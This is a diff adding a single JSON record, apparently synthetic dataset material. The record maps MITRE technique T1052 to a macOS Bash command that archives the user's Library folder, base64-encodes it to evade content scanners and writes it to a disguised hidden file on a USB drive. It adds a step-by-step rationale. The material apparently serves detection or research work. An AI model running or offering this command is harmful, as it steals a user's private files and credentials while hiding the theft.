@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library\" | base64 | dd of=\"/Volumes/USB/.printerlogs.txt\" bs=4m conv=sync && sync",
+  "explanation": "Packages the user's Library folder, base64-encodes it to appear text-like, and writes it to a log-looking file on a removable drive using dd.",
+  "rationale_steps": [
+    "Archive the Library directory to a single stream.",
+    "Apply base64 to make the payload appear as textual data to simple content scanners.",
+    "Write the encoded stream to the external media via dd.",
+    "Sync to ensure all data is committed to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-be34993e",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
